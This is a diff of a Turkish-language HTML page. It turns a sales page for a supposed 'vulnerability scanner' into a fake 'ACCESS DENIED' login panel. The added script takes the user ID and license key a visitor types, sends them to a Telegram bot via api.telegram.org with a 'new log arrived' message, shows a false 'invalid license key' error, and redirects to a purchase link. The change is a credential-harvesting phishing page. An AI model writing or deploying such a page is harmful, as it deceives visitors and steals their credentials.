@@ -3,24 +3,46 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PROFESSOR-Security | Siber Analiz</title>
+    <title>PROFESSOR-SECURITY | GLOBAL LAB</title>
     <style>
-        body { background: #050505; color: #00ff41; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .terminal { border: 2px solid #00ff41; padding: 30px; background: #000; box-shadow: 0 0 25px #00ff41; text-align: center; width: 90%; max-width: 500px; }
-        .btn { background: #00ff41; color: #000; padding: 15px 25px; text-decoration: none; font-weight: bold; display: inline-block; margin-top: 25px; border-radius: 5px; transition: 0.3s; }
-        .btn:hover { background: #fff; box-shadow: 0 0 20px #fff; }
-        hr { border: 0; border-top: 1px solid #00ff41; margin: 20px 0; }
+        body { background: #000; color: #00ff41; font-family: 'Courier New', Courier, monospace; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; overflow: hidden; }
+        .matrix-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; opacity: 0.1; }
+        .panel { border: 1px solid #00ff41; background: rgba(0, 20, 0, 0.9); padding: 40px; box-shadow: 0 0 30px #00ff41; text-align: center; width: 400px; }
+        h1 { font-size: 1.5rem; letter-spacing: 5px; margin-bottom: 20px; text-shadow: 0 0 10px #00ff41; }
+        input { width: 100%; padding: 10px; margin: 10px 0; background: #000; border: 1px solid #00ff41; color: #00ff41; outline: none; box-sizing: border-box; }
+        .btn { background: #00ff41; color: #000; padding: 12px 20px; border: none; cursor: pointer; font-weight: bold; width: 100%; margin-top: 10px; text-decoration: none; display: inline-block; }
+        .status { font-size: 0.8rem; margin-top: 15px; color: #888; }
     </style>
 </head>
 <body>
-    <div class="terminal">
-        <h1>[!] PROFESSOR-SECURITY</h1>
-        <p>> SİSTEM DURUMU: ANALİZ MODU</p>
-        <p>> KRİTİK ZAFİYET TARAYICI v1.0</p>
-        <hr>
-        <p>Derin Sızıntı Testi & Finansal Log Analizi</p>
-        <p>Fiyat: 20 USDT</p>
-        <a href="https://payhip.com/SİZİN_LİNKİNİZ" class="btn">YAZILIMI SATIN AL</a>
+    <div class="panel">
+        <h1>ACCESS DENIED</h1>
+        <p>> KRİTİK ANALİZ PANELİ v2.4</p>
+        <hr style="border: 0; border-top: 1px dotted #00ff41;">
+        
+        <input type="text" id="user" placeholder="USER_ID">
+        <input type="password" id="pass" placeholder="LICENSE_KEY">
+        
+        <button onclick="sendLog()" class="btn">SİSTEME GİRİŞ YAP</button>
+        
+        <div class="status">Cihaz İP ve Konum Bilgisi Alınıyor...</div>
     </div>
+
+    <script>
+        function sendLog() {
+            const botToken = "BURAYA_BOT_TOKEN_GELECEK";
+            const chatId = "BURAYA_ID_GELECEK";
+            const u = document.getElementById('user').value;
+            const p = document.getElementById('pass').value;
+            
+            const text = `🚀 YENİ LOG GELDİ!\n\n👤 Kullanıcı: ${u}\n🔑 Anahtar: ${p}`;
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
+            .then(() => {
+                alert("Hata: Lisans anahtarı geçersiz! Lütfen admin ile iletişime geçin.");
+                window.location.href = "https://payhip.com/SİZİN_LİNKİNİZ";
+            });
+        }
+    </script>
 </body>
 </html>
